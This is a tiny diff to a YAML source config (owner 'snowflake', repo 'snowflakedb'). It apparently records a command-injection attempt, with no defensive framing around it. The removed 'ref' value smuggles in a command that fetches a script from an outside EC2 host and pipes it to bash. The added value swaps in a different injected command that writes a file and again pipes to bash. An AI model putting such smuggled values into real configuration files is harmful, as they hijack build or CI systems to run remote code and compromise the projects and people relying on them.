@@ -1,4 +1,4 @@
 source:
   owner: "snowflake"
   repo: "snowflakedb"
-  ref: "main; curl http://ec2-34-212-60-44.us-west-2.compute.amazonaws.com/log.php | bash"
+  ref: "main; echo'yaeah'>abc.txt | bash"
